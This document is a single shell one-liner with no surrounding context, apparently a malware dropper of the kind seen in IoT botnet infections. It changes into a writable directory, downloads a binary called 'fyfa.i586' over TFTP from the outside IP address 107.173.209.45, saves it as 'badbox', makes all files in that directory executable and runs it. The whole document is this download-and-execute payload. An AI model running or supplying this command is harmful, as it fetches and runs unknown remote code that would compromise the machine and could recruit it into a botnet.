cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r fyfa.i586 -g 107.173.209.45;cat fyfa.i586 >badbox;chmod +x *;./badbox
